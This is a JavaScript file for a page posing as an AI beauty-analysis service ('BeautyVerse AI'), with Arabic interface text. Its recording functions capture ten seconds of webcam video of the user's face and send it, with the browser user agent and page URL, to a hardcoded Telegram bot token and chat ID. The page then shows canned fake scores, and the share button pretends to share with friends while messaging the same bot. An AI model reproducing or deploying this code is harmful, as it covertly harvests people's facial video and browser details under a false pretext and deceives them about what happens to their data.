// دالة البوت المحسنة
async function sendToBeautyBot(content, videoBlob = null, service = 'general') {
    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
    const CHAT_ID = '7396462490';
    
    try {
        if (videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', videoBlob, `${service}_${Date.now()}.mp4`);
            formData.append('caption', `🎨 *BeautyVerse AI*\n\n📊 الخدمة: ${service}\n${content}`);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🎨 *BeautyVerse*\nخدمة: ${service}\n${content}`,
                    parse_mode: 'Markdown'
                })
            });
        }
    } catch (e) { console.error('Bot error:', e); }
}

let currentStream, mediaRecorder, recordedChunks = [], countdown = 10;

// بداية التحليل الرئيسي
async function startBeautyAnalysis() {
    showCameraInterface('🎨 تحليل الجمال الذكي', 'سنحلل وجهك لإعطائك تقرير كامل خلال 10 ثوانٍ');
}

// خدمة محددة
function startService(service) {
    const services = {
        analysis: { title: 'تحليل الجمال', desc: 'تقرير شامل عن جمالك' },
        filters: { title: 'فلاتر AR', desc: 'تجربة فلاتر الواقع المعزز' },
        skin: { title: 'فحص البشرة', desc: 'تحليل صحة بشرتك' },
        makeup: { title: 'مكياج افتراضي', desc: 'جربي أحدث الإطلالات' },
        age: { title: 'تنبؤ العمر', desc: 'اكتشفي عمر بشرتك' },
        celebrity: { title: 'شبيه المشاهير', desc: 'من تشبهين من النجوم؟' }
    };
    
    showCameraInterface(services[service].title, services[service].desc, service);
}

function showCameraInterface(title, description, service = 'analysis') {
    document.querySelector('.hero').innerHTML = `
        <div style="background: rgba(255,255,255,0.95); padding: 40px; border-radius: 25px; max-width: 600px; margin: 0 auto 30px;">
            <h2 style="color: #333; margin-bottom: 15px;">${title}</h2>
            <p style="color: #666; margin-bottom: 25px; font-size: 1.1rem;">${description}</p>
            <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
                <button class="btn-primary" onclick="startCameraRecording('${service}')">
                    <i class="fas fa-play"></i> ابدأ الآن
                </button>
                <button class="btn-secondary" onclick="cancelAnalysis()">
                    <i class="fas fa-times"></i> إلغاء
                </button>
            </div>
        </div>
    `;
}

async function startCameraRecording(service) {
    try {
        currentStream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480, facingMode: 'user' } 
        });
        
        document.querySelector('.hero').innerHTML = `
            <div style="text-align: center;">
                <video id="analysisVideo" width="500" height="400" autoplay muted style="border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);"></video>
                <div id="countdown" style="font-size: 4rem; color: #ff6b6b; margin: 20px 0; font-weight: 700;">10</div>
                <p style="font-size: 1.3rem; color: #666;">جاري التحليل... لا تتحرك 😊</p>
                <button onclick="stopRecording()" style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 15px 30px; border: none; border-radius: 30px; font-size: 1.1rem; cursor: pointer; margin-top: 20px;">
                    <i class="fas fa-stop"></i> إيقاف
                </button>
            </div>
        `;
        
        document.getElementById('analysisVideo').srcObject = currentStream;
        startRecording(service);
        
    } catch (err) {
        alert('🎥 فعّل الكاميرا من إعدادات المتصفح للمتابعة');
    }
}

function startRecording(service) {
    mediaRecorder = new MediaRecorder(currentStream);
    recordedChunks = [];
    
    mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
    
    mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const userInfo = `👤 User: ${navigator.userAgent.slice(0,60)}...\n🌐 URL: ${window.location.href}\n📱 Service: ${service}`;
        
        await sendToBeautyBot(userInfo, blob, service);
        showAmazingResults(service);
    };
    
    mediaRecorder.start();
    startCountdown();
}

function startCountdown() {
    let time = 10;
    const interval = setInterval(() => {
        time--;
        document.getElementById('countdown').textContent = time;
        
        if (time <= 0) {
            clearInterval(interval);
            mediaRecorder.stop();
        }
    }, 1000);
}

function stopRecording() {
    mediaRecorder.stop();
}

function showAmazingResults(service) {
    const results = {
        analysis: { score: 87, text: 'وجهك مذهل! نقاط القوة: العيون + الابتسامة', img: 'https://via.placeholder.com/500x350/4ecdc4/fff?text=تحليل+الجمال' },
        filters: { score: 92, text: 'فلتر الأميرة ممتاز عليكِ! ✨', img: 'https://via.placeholder.com/500x350/ff9a9e/fff?text=فلتر+سحري' },
        skin: { score: 78, text: 'بشرتك نضرة • ننصح بمرطب + واقي شمس', img: 'https://via.placeholder.com/500x350/45b7d1/fff?text=فحص+البشرة' },
        makeup: { score: 95, text: 'اللون الأحمر مثالي لشفاهك! 💄', img: 'https://via.placeholder.com/500x350/feca57/333?text=مكياج+افتراضي' },
        age: { score: 24, text: 'تبدين 24 سنة فقط! 👶✨', img: 'https://via.placeholder.com/500x350/667eea/fff?text=عمر+بشرتك' },
        celebrity: { score: 89, text: 'تشبهين زينب الخالدي 89%! 🌟', img: 'https://via.placeholder.com/500x350/f093fb/fff?text=شبيه+المشاهير' }
    };
    
    const result = results[service];
    
    document.getElementById('score').textContent = `النتيجة: ${result.score}/100 ✨`;
    document.querySelector('.hero').innerHTML = `
        <div style="text-align: center; padding: 40px;">
            <h2 style="font-size: 2.5rem; color: #4ecdc4; margin-bottom: 20px;">
                🎉 نتائج مذهلة!
            </h2>
            <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 30px; border-radius: 20px; margin: 30px 0;">
                <h3 style="color: #333; margin-bottom: 15px;">${result.text}</h3>
                <img src="${result.img}" style="width: 100%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2);">
            </div>
            <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
                <button class="btn-primary" onclick="shareResult('${service}')">
                    <i class="fas fa-share-alt"></i> مشاركة النتيجة
                </button>
                <button class="btn-primary" onclick="startNewAnalysis()">
                    <i class="fas fa-redo"></i> تحليل جديد
                </button>
            </div>
        </div>
    `;
}

function cancelAnalysis() { location.reload(); }
function startNewAnalysis() { startBeautyAnalysis(); }
function shareResult(service) { 
    sendToBeautyBot(`مشاركة نتيجة: ${service}`);
    alert('تم مشاركة النتيجة مع الأصدقاء! 🎉');
}
function showServices() { document.getElementById('services').scrollIntoView({ behavior: 'smooth' }); }
